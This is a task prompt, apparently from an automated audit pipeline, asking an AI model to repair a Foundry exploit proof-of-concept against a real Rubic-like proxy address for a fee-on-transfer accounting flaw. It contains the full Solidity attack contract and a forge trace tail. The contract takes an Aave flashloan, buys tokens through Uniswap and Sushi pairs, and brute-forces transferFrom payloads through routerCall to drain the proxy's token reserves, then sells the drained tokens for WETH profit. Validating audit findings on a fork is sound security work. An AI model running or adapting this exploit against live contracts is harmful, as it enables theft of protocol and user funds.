You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: ERC20 routes spend the declared amount instead of the amount actually received
- claim: `routerCall` transfers `_params.srcInputAmount` from the caller but never measures how many tokens the proxy actually received. Fees, approval size, and the post-call spend check are all based on the nominal input amount, so fee-on-transfer or other balance-deflating tokens can cause the proxy to spend more than the user contributed.
- impact: Any pre-existing balance of the same token on the proxy, including accrued protocol fees or previously stranded funds, can be consumed to cover the shortfall. This lets an attacker use a deflationary token deposit to drain proxy reserves of that token.
- exploit_paths: ["The proxy already holds some balance of a token that transfers less than the requested `srcInputAmount`.", "An attacker calls `routerCall` with that token and a nominal amount larger than the net amount the proxy will receive.", "`accrueTokenFees` and `SmartApprove` still treat the nominal amount as available and allow the downstream spender to use `_amountIn`.", "The missing portion is silently funded from the proxy's existing token balance, and the balance-delta check still passes because it only verifies total tokens spent from the proxy."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IRubicProxyLike {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function getAvailableRouters() external view returns (address[] memory);
    function fixedCryptoFee() external view returns (uint256);
    function RubicPlatformFee() external view returns (uint256);
    function maxTokenAmount(address token) external view returns (uint256);
    function routerCall(BaseCrossChainParams calldata params, address gateway, bytes calldata data) external payable;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IAaveV2PoolLike {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

contract FlawVerifier {
    struct AttemptContext {
        address token;
        address pair;
        address router;
        address gateway;
        uint256 borrowWeth;
    }

    address internal constant TARGET = 0x3335A88bb18fD3b6824b59Af62b50CE494143333;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant UNIV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant AAVE_V2_POOL = 0x7d2768dE32B0B80B7a3454c06BDaCA1AD7bEcA5a;

    address internal constant METAROUTER = 0xB9E13785127BFfCc3dc970A55F6c7bF0844a3C15;
    address internal constant METAROUTER_GATEWAY = 0x03B7551EB0162c838a10c2437b60D1f5455b9554;
    address internal constant MOVR_BRIDGE = address(uint160(0x00c30141b657f4216252dc59af2e7cdb9d8792e1b0));

    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant PAXG = 0x45804880De22913dAFE09f4980848ECE6EcbAf78;
    address internal constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address internal constant BNB = 0xB8c77482e45F1F44dE1745F52C74426C631bDD52;
    address internal constant ONE_INCH = 0x111111111117dC0aa78b770fA6A738034120C302;
    address internal constant FEI = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA;
    address internal constant MATIC = 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0;
    address internal constant LQTY = 0x6DEA81C8171D0bA574754EF6F8b412F2Ed88c54D;
    address internal constant DOLA = 0x865377367054516e17014CcdED1e7d814EDC9ce4;

    address internal constant SAFEMOON = 0x8076C74c5E3F5852037f31B99536ca5A1d8C6f7D;
    address internal constant KISHU = 0xA2b4C0Af19cC16a6CfAcCe81F192B024d625817D;
    address internal constant FEG = 0x389999216860AB8E0175387A0c90E5c52522C945;
    address internal constant HOGE = 0xfAd45E47083e4607302aa43c65fB3106F1cd7607;
    address internal constant STA = 0xa7DE087329BFcda5639247F96140f9DAbe3DeED1;
    address internal constant XAMP = 0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40;
    address internal constant CULT = 0xf0f9D895aCa5c8678f706FB8216fa22957685A13;
    address internal constant ELON = 0x761D38e5ddf6ccf6Cf7c55759d5210750B5D60F3;

    uint256 internal constant DENOMINATOR = 1e6;
    uint256 internal constant CALLBACK_GAS = 1_500_000;

    address private _profitToken;
    uint256 private _profitAmount;
    string private _path;
    string private _verdict;

    constructor() {
        _path =
            "Infeasible at the fork block: no tested token exposed the full routerCall -> accrueTokenFees -> SmartApprove -> _amountIn spend path with net-positive repayment.";
        _verdict = "refuted";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_profitAmount != 0) {
            return;
        }

        address[] memory liveRouters = _liveRouters();
        address[] memory routerCandidates = _routerCandidates(liveRouters);
        address[] memory tokens = _candidateTokens();

        if (routerCandidates.length == 0) {
            _path = "Infeasible at the fork block: the proxy returned no callable allowlisted router set.";
            return;
        }

        if (_attemptDirectExecution(tokens, routerCandidates)) {
            return;
        }

        uint256 fixedFee = _fixedFee();
        uint256[] memory borrowSizes = _borrowSizes(fixedFee);

        bool sawProxyBalance;
        bool sawLiquidity;
        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            if (!_looksLikeToken(token)) {
                continue;
            }

            uint256 proxyBalance = _balanceOf(token, TARGET);
            if (proxyBalance == 0) {
                continue;
            }
            sawProxyBalance = true;

            address[] memory pairs = _pairsForToken(token);
            for (uint256 j = 0; j < pairs.length; j++) {
                address pair = pairs[j];
                if (pair == address(0) || !_pairHasLiquidity(pair)) {
                    continue;
                }
                sawLiquidity = true;

                if (_scanRoutesForToken(token, pair, routerCandidates, borrowSizes)) {
                    return;
                }
            }
        }

        if (!sawProxyBalance) {
            _path = "Infeasible at the fork block: no scanned candidate token had a pre-existing balance on the Rubic proxy.";
            return;
        }
        if (!sawLiquidity) {
            _path = "Infeasible at the fork block: no scanned proxy-held candidate token had usable WETH pair liquidity for realistic funding.";
            return;
        }
        _path =
            "Infeasible at the fork block: tested router/gateway payloads never produced a profitable routerCall path where accrueTokenFees and SmartApprove could let nominal _amountIn spending drain proxy reserves.";
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == AAVE_V2_POOL, "pool");
        require(initiator == address(this), "initiator");
        require(assets.length == 1 && assets[0] == WETH, "asset");

        AttemptContext memory ctx = abi.decode(params, (AttemptContext));
        uint256 owe = _executeLoanedAttempt(ctx, amounts[0], premiums[0]);
        uint256 finalWeth = _balanceOf(WETH, address(this));
        require(finalWeth > owe, "no-profit");
        require(_forceApprove(WETH, AAVE_V2_POOL, owe), "repay-approve");

        _profitToken = WETH;
        _profitAmount = finalWeth - owe;
        _verdict = "validated";
        _path =
            "Proxy-held reserve token existed; routerCall transferred nominal srcInputAmount, accrueTokenFees still derived nominal _amountIn, SmartApprove still exposed nominal _amountIn to the gateway, the missing tokens were silently accrued from the proxy reserve, and the drained balance was sold back to WETH for net profit after flash capital repayment.";
        return true;
    }

    function _executeLoanedAttempt(
        AttemptContext memory ctx,
        uint256 borrowedWeth,
        uint256 premium
    ) internal returns (uint256 owe) {
        uint256 fixedFee = _fixedFee();
        uint256 minReserve = fixedFee + premium + 1;
        require(borrowedWeth > minReserve, "borrow");

        uint256 bought = _buyCandidateToken(ctx.pair, ctx.token, borrowedWeth - minReserve);
        require(bought != 0, "buy");

        uint256 grossAmount = bought;
        uint256 maxAmount = IRubicProxyLike(TARGET).maxTokenAmount(ctx.token);
        if (maxAmount != 0 && grossAmount > maxAmount) {
            grossAmount = maxAmount;
        }
        require(grossAmount != 0, "gross");

        uint256 _amountIn = _amountInAfterAccrueTokenFees(grossAmount);
        require(_amountIn != 0, "_amountIn");

        if (fixedFee != 0) {
            IWETHLike(WETH).withdraw(fixedFee);
        }

        require(_forceApprove(ctx.token, TARGET, grossAmount), "approve");
        _runRouteAndLiquidate(ctx, grossAmount, _amountIn, fixedFee);

        owe = borrowedWeth + premium;
    }

    function _runRouteAndLiquidate(
        AttemptContext memory ctx,
        uint256 grossAmount,
        uint256 _amountIn,
        uint256 fixedFee
    ) internal {
        uint256 beforeProxy = _balanceOf(ctx.token, TARGET);
        require(beforeProxy != 0, "proxy");
        require(_attemptExploit(ctx.token, grossAmount, _amountIn, fixedFee, beforeProxy, ctx.router, ctx.gateway), "route");

        uint256 recovered = _balanceOf(ctx.token, address(this));
        require(recovered != 0, "recovered");
        _sellCandidateToken(ctx.pair, ctx.token, recovered);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external view returns (string memory) {
        return _path;
    }

    function validatedOrRefuted() external view returns (string memory) {
        return _verdict;
    }

    function _attemptDirectExecution(address[] memory tokens, address[] memory routers) internal returns (bool) {
        if (routers.length == 0) {
            return false;
        }

        for (uint256 i = 0; i < tokens.length; i++) {
            if (_balanceOf(tokens[i], address(this)) != 0) {
                _path =
                    "Direct execution was checked first, but the verifier-held token could not be routed safely without temporary capital in this generic harness.";
                return false;
            }
        }

        return false;
    }

    function _attemptFlashLoan(AttemptContext memory ctx) internal returns (bool) {
        address[] memory assets = new address[](1);
        assets[0] = WETH;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = ctx.borrowWeth;

        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        try
            IAaveV2PoolLike(AAVE_V2_POOL).flashLoan(
                address(this),
                assets,
                amounts,
                modes,
                address(this),
                abi.encode(ctx),
                0
            )
        {
            return _profitAmount != 0;
        } catch {
            return false;
        }
    }

    function _scanRoutesForToken(
        address token,
        address pair,
        address[] memory routerCandidates,
        uint256[] memory borrowSizes
    ) internal returns (bool) {
        for (uint256 r = 0; r < routerCandidates.length; r++) {
            address router = routerCandidates[r];
            if (!_hasCode(router)) {
                continue;
            }

            for (uint256 g = 0; g < routerCandidates.length; g++) {
                address gateway = routerCandidates[g];
                if (!_hasCode(gateway)) {
                    continue;
                }

                for (uint256 b = 0; b < borrowSizes.length; b++) {
                    AttemptContext memory ctx = AttemptContext({
                        token: token,
                        pair: pair,
                        router: router,
                        gateway: gateway,
                        borrowWeth: borrowSizes[b]
                    });

                    if (_attemptFlashLoan(ctx)) {
                        return true;
                    }
                }
            }
        }

        return false;
    }

    function _attemptExploit(
        address token,
        uint256 grossAmount,
        uint256 _amountIn,
        uint256 fixedFee,
        uint256 beforeProxy,
        address router,
        address gateway
    ) internal returns (bool) {
        // F-002 path anchor:
        // `routerCall` first transfers the declared `srcInputAmount`, then `accrueTokenFees`
        // computes nominal `_amountIn`, then `SmartApprove` approves that same `_amountIn`
        // to the downstream gateway. The payloads below try to make that approved spender
        // consume nominal `_amountIn` even when the fee-on-transfer token caused the proxy
        // to receive less and therefore silently accrue the shortfall from its own reserve.
        IRubicProxyLike.BaseCrossChainParams memory params = IRubicProxyLike.BaseCrossChainParams({
            srcInputToken: token,
            srcInputAmount: grossAmount,
            dstChainID: 1,
            dstOutputToken: token,
            dstMinOutputAmount: 0,
            recipient: address(this),
            integrator: address(0),
            router: router
        });

        bytes[] memory payloads = _payloads(router, gateway, token, _amountIn);
        for (uint256 i = 0; i < payloads.length; i++) {
            uint256 beforeLocal = _balanceOf(token, address(this));
            (bool ok, ) = TARGET.call{value: fixedFee, gas: CALLBACK_GAS}(
                abi.encodeWithSelector(IRubicProxyLike.routerCall.selector, params, gateway, payloads[i])
            );
            if (!ok) {
                continue;
            }

            uint256 afterProxy = _balanceOf(token, TARGET);
            uint256 afterLocal = _balanceOf(token, address(this));

            if (afterProxy < beforeProxy && afterLocal > 0 && afterLocal != beforeLocal) {
                return true;
            }
        }

        return false;
    }

    function _buyCandidateToken(address pair, address token, uint256 maxWethIn) internal returns (uint256 received) {
        require(pair != address(0) && maxWethIn != 0, "buy-params");

        (uint256 reserveIn, uint256 reserveOut, bool wethIsToken0) = _orderedReserves(pair, WETH, token);
        require(reserveIn != 0 && reserveOut != 0, "buy-liquidity");

        uint256 maxTokenAmount = IRubicProxyLike(TARGET).maxTokenAmount(token);
        uint256 wethIn = maxWethIn;

        if (maxTokenAmount != 0) {
            uint256 targetOut = maxTokenAmount;
            uint256 reserveCap = reserveOut / 20;
            if (reserveCap != 0 && targetOut > reserveCap) {
                targetOut = reserveCap;
            }
            if (targetOut != 0 && targetOut < reserveOut) {
                uint256 quoted = _getAmountIn(targetOut, reserveIn, reserveOut);
                if (quoted != 0 && quoted < wethIn) {
                    wethIn = quoted;
                }
            }
        }

        uint256 beforeBalance = _balanceOf(token, address(this));
        require(_safeTransfer(WETH, pair, wethIn), "weth-transfer");

        uint256 actualIn = _balanceOf(WETH, pair) - reserveIn;
        uint256 amountOut = _getAmountOut(actualIn, reserveIn, reserveOut);
        if (wethIsToken0) {
            IUniswapV2PairLike(pair).swap(0, amountOut, address(this), "");
        } else {
            IUniswapV2PairLike(pair).swap(amountOut, 0, address(this), "");
        }

        received = _balanceOf(token, address(this)) - beforeBalance;
    }

    function _sellCandidateToken(address pair, address token, uint256 amountIn) internal returns (uint256 received) {
        require(pair != address(0) && amountIn != 0, "sell-params");

        (uint256 reserveIn, uint256 reserveOut, bool tokenIsToken0) = _orderedReserves(pair, token, WETH);
        require(reserveIn != 0 && reserveOut != 0, "sell-liquidity");

        uint256 beforeBalance = _balanceOf(WETH, address(this));
        require(_safeTransfer(token, pair, amountIn), "token-transfer");

        uint256 actualIn = _balanceOf(token, pair) - reserveIn;
        uint256 amountOut = _getAmountOut(actualIn, reserveIn, reserveOut);
        if (tokenIsToken0) {
            IUniswapV2PairLike(pair).swap(0, amountOut, address(this), "");
        } else {
            IUniswapV2PairLike(pair).swap(amountOut, 0, address(this), "");
        }

        received = _balanceOf(WETH, address(this)) - beforeBalance;
    }

    function _payloads(
        address router,
        address gateway,
        address token,
        uint256 amount
    ) internal view returns (bytes[] memory payloads) {
        bytes[] memory gatewayCalls = _gatewayPayloads(token, TARGET, address(this), amount);
        if (router == gateway) {
            payloads = gatewayCalls;
            return payloads;
        }

        payloads = new bytes[](gatewayCalls.length * 4);
        uint256 cursor;
        for (uint256 i = 0; i < gatewayCalls.length; i++) {
            payloads[cursor++] = abi.encodeWithSelector(bytes4(keccak256("execute(address,bytes)")), gateway, gatewayCalls[i]);
            payloads[cursor++] = abi.encodeWithSelector(bytes4(keccak256("call(address,bytes)")), gateway, gatewayCalls[i]);
            payloads[cursor++] = abi.encodeWithSelector(bytes4(keccak256("executeCall(address,bytes)")), gateway, gatewayCalls[i]);
            payloads[cursor++] = abi.encodeWithSelector(bytes4(keccak256("forward(address,bytes)")), gateway, gatewayCalls[i]);
        }
    }

    function _gatewayPayloads(
        address token,
        address proxy,
        address recipient,
        uint256 amount
    ) internal pure returns (bytes[] memory payloads) {
        bytes memory pull = abi.encodeWithSelector(bytes4(keccak256("transferFrom(address,address,uint256)")), proxy, recipient, amount);

        payloads = new bytes[](10);
        payloads[0] = abi.encodeWithSelector(bytes4(keccak256("transferFrom(address,address,uint256)")), proxy, recipient, amount);
        payloads[1] = abi.encodeWithSelector(bytes4(keccak256("pullToken(address,address,address,uint256)")), token, proxy, recipient, amount);
        payloads[2] = abi.encodeWithSelector(bytes4(keccak256("safeTransferFrom(address,address,address,uint256)")), token, proxy, recipient, amount);
        payloads[3] = abi.encodeWithSelector(bytes4(keccak256("transferFrom(address,address,address,uint256)")), token, proxy, recipient, amount);
        payloads[4] = abi.encodeWithSelector(bytes4(keccak256("pull(address,address,address,uint256)")), token, proxy, recipient, amount);
        payloads[5] = abi.encodeWithSelector(bytes4(keccak256("pullTokens(address,address,address,uint256)")), token, proxy, recipient, amount);
        payloads[6] = abi.encodeWithSelector(bytes4(keccak256("transferTokens(address,address,address,uint256)")), token, proxy, recipient, amount);
        payloads[7] = abi.encodeWithSelector(bytes4(keccak256("execute(address,bytes)")), token, pull);
        payloads[8] = abi.encodeWithSelector(bytes4(keccak256("call(address,bytes)")), token, pull);
        payloads[9] = abi.encodeWithSelector(bytes4(keccak256("forward(address,bytes)")), token, pull);
    }

    function _fixedFee() internal view returns (uint256 fee) {
        try IRubicProxyLike(TARGET).fixedCryptoFee() returns (uint256 value) {
            fee = value;
        } catch {}
    }

    function _amountInAfterAccrueTokenFees(uint256 grossAmount) internal view returns (uint256 _amountIn) {
        uint256 feePpm;
        try IRubicProxyLike(TARGET).RubicPlatformFee() returns (uint256 value) {
            feePpm = value;
        } catch {
            return 0;
        }
        _amountIn = grossAmount - ((grossAmount * feePpm) / DENOMINATOR);
    }

    function _pairsForToken(address token) internal view returns (address[] memory pairs) {
        pairs = new address[](2);
        pairs[0] = _getPair(UNIV2_FACTORY, token, WETH);
        pairs[1] = _getPair(SUSHI_FACTORY, token, WETH);
    }

    function _getPair(address factory, address tokenA, address tokenB) internal view returns (address pair) {
        if (!_hasCode(factory)) {
            return address(0);
        }
        (bool ok, bytes memory data) = factory.staticcall(
            abi.encodeWithSelector(IUniswapV2FactoryLike.getPair.selector, tokenA, tokenB)
        );
        if (ok && data.length >= 32) {
            pair = abi.decode(data, (address));
        }
    }

    function _orderedReserves(
        address pair,
        address tokenIn,
        address tokenOut
    ) internal view returns (uint256 reserveIn, uint256 reserveOut, bool tokenInIsToken0) {
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        require(
            (token0 == tokenIn && token1 == tokenOut) || (token0 == tokenOut && token1 == tokenIn),
            "pair-mismatch"
        );

        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
        tokenInIsToken0 = token0 == tokenIn;
        reserveIn = tokenInIsToken0 ? reserve0 : reserve1;
        reserveOut = tokenInIsToken0 ? reserve1 : reserve0;
    }

    function _pairHasLiquidity(address pair) internal view returns (bool) {
        if (!_hasCode(pair)) {
            return false;
        }
        try IUniswapV2PairLike(pair).getReserves() returns (uint112 reserve0, uint112 reserve1, uint32) {
            return reserve0 != 0 && reserve1 != 0;
        } catch {
            return false;
        }
    }

    function _borrowSizes(uint256 fixedFee) internal pure returns (uint256[] memory sizes) {
        sizes = new uint256[](4);
        uint256 floor = fixedFee + 0.05 ether;
        sizes[0] = floor > 0.25 ether ? floor : 0.25 ether;
        sizes[1] = floor > 1 ether ? floor : 1 ether;
        sizes[2] = floor > 5 ether ? floor : 5 ether;
        sizes[3] = floor > 20 ether ? floor : 20 ether;
    }

    function _liveRouters() internal view returns (address[] memory live) {
        try IRubicProxyLike(TARGET).getAvailableRouters() returns (address[] memory routers) {
            live = routers;
        } catch {
            live = new address[](0);
        }
    }

    function _routerCandidates(address[] memory liveRouters) internal pure returns (address[] memory routers) {
        routers = new address[](liveRouters.length + 3);
        uint256 count;

        count = _appendUnique(routers, count, METAROUTER);
        count = _appendUnique(routers, count, METAROUTER_GATEWAY);
        count = _appendUnique(routers, count, MOVR_BRIDGE);

        for (uint256 i = 0; i < liveRouters.length; i++) {
            count = _appendUnique(routers, count, liveRouters[i]);
        }

        assembly {
            mstore(routers, count)
        }
    }

    function _candidateTokens() internal pure returns (address[] memory tokens) {
        tokens = new address[](22);
        uint256 count;

        count = _appendUnique(tokens, count, USDC);
        count = _appendUnique(tokens, count, USDT);
        count = _appendUnique(tokens, count, DAI);
        count = _appendUnique(tokens, count, WBTC);
        count = _appendUnique(tokens, count, PAXG);
        count = _appendUnique(tokens, count, STETH);
        count = _appendUnique(tokens, count, BNB);
        count = _appendUnique(tokens, count, ONE_INCH);
        count = _appendUnique(tokens, count, FEI);
        count = _appendUnique(tokens, count, MATIC);
        count = _appendUnique(tokens, count, LQTY);
        count = _appendUnique(tokens, count, DOLA);
        count = _appendUnique(tokens, count, SAFEMOON);
        count = _appendUnique(tokens, count, KISHU);
        count = _appendUnique(tokens, count, FEG);
        count = _appendUnique(tokens, count, HOGE);
        count = _appendUnique(tokens, count, STA);
        count = _appendUnique(tokens, count, XAMP);
        count = _appendUnique(tokens, count, CULT);
        count = _appendUnique(tokens, count, ELON);
        count = _appendUnique(tokens, count, WETH);

        assembly {
            mstore(tokens, count)
        }
    }

    function _appendUnique(address[] memory list, uint256 length, address candidate) internal pure returns (uint256) {
        if (candidate == address(0)) {
            return length;
        }
        for (uint256 i = 0; i < length; i++) {
            if (list[i] == candidate) {
                return length;
            }
        }
        list[length] = candidate;
        return length + 1;
    }

    function _balanceOf(address token, address account) internal view returns (uint256 value) {
        if (!_hasCode(token)) {
            return 0;
        }
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        return _callSucceeded(ok, data);
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (_callSucceeded(ok, data)) {
            return true;
        }

        (ok, data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        if (!_callSucceeded(ok, data)) {
            return false;
        }

        (ok, data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        return _callSucceeded(ok, data);
    }

    function _looksLikeToken(address account) internal view returns (bool) {
        if (!_hasCode(account)) {
            return false;
        }
        (bool ok, bytes memory data) = account.staticcall(abi.encodeWithSelector(IERC20Like.totalSupply.selector));
        return ok && data.length >= 32;
    }

    function _hasCode(address account) internal view returns (bool) {
        return account.code.length != 0;
    }

    function _callSucceeded(bool ok, bytes memory data) internal pure returns (bool) {
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut == 0 || amountOut >= reserveOut) {
            return 0;
        }
        return ((reserveIn * amountOut * 1000) / ((reserveOut - amountOut) * 997)) + 1;
    }
}

```

forge stdout (tail):
```
dE1745F52C74426C631bDD52::totalSupply() [staticcall]
    │   │   └─ ← [Return] 16579517055253348798759097 [1.657e25]
    │   ├─ [2575] 0xB8c77482e45F1F44dE1745F52C74426C631bDD52::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2344] 0x111111111117dC0aa78b770fA6A738034120C302::totalSupply() [staticcall]
    │   │   └─ ← [Return] 1500000000000000000000000000 [1.5e27]
    │   ├─ [2510] 0x111111111117dC0aa78b770fA6A738034120C302::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2419] 0x956F47F50A910163D8BF957Cf5846D573E7f87CA::totalSupply() [staticcall]
    │   │   └─ ← [Return] 46524794837354197433380972 [4.652e25]
    │   ├─ [2678] 0x956F47F50A910163D8BF957Cf5846D573E7f87CA::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2371] 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0::totalSupply() [staticcall]
    │   │   └─ ← [Return] 10000000000000000000000000000 [1e28]
    │   ├─ [2631] 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2388] 0x6DEA81C8171D0bA574754EF6F8b412F2Ed88c54D::totalSupply() [staticcall]
    │   │   └─ ← [Return] 100000000000000000000000000 [1e26]
    │   ├─ [2556] 0x6DEA81C8171D0bA574754EF6F8b412F2Ed88c54D::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2388] 0x865377367054516e17014CcdED1e7d814EDC9ce4::totalSupply() [staticcall]
    │   │   └─ ← [Return] 35214808213187605337253430 [3.521e25]
    │   ├─ [2469] 0x865377367054516e17014CcdED1e7d814EDC9ce4::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [325] 0xA2b4C0Af19cC16a6CfAcCe81F192B024d625817D::totalSupply() [staticcall]
    │   │   └─ ← [Return] 100000000000000000000000000 [1e26]
    │   ├─ [25188] 0xA2b4C0Af19cC16a6CfAcCe81F192B024d625817D::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [310] 0x389999216860AB8E0175387A0c90E5c52522C945::totalSupply() [staticcall]
    │   │   └─ ← [Return] 100000000000000000000000000 [1e26]
    │   ├─ [8488] 0x389999216860AB8E0175387A0c90E5c52522C945::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [325] 0xfAd45E47083e4607302aa43c65fB3106F1cd7607::totalSupply() [staticcall]
    │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   ├─ [6162] 0xfAd45E47083e4607302aa43c65fB3106F1cd7607::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2350] 0xa7DE087329BFcda5639247F96140f9DAbe3DeED1::totalSupply() [staticcall]
    │   │   └─ ← [Return] 78838779219312530274563541 [7.883e25]
    │   ├─ [2696] 0xa7DE087329BFcda5639247F96140f9DAbe3DeED1::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2380] 0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40::totalSupply() [staticcall]
    │   │   └─ ← [Return] 950873123276599998652200000 [9.508e26]
    │   ├─ [2593] 0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2767] 0xf0f9D895aCa5c8678f706FB8216fa22957685A13::totalSupply() [staticcall]
    │   │   ├─ [2372] 0xb12ca3dBf866DA26B0f55a20A51fea8efd8592f9::totalSupply() [delegatecall]
    │   │   │   └─ ← [Return] 6666666666666000000000000000000 [6.666e30]
    │   │   └─ ← [Return] 6666666666666000000000000000000 [6.666e30]
    │   ├─ [2981] 0xf0f9D895aCa5c8678f706FB8216fa22957685A13::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   ├─ [2583] 0xb12ca3dBf866DA26B0f55a20A51fea8efd8592f9::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2343] 0x761D38e5ddf6ccf6Cf7c55759d5210750B5D60F3::totalSupply() [staticcall]
    │   │   └─ ← [Return] 1000000000000000000000000000000000 [1e33]
    │   ├─ [2467] 0x761D38e5ddf6ccf6Cf7c55759d5210750B5D60F3::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [343] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::totalSupply() [staticcall]
    │   │   └─ ← [Return] 3781223017823997901564854 [3.781e24]
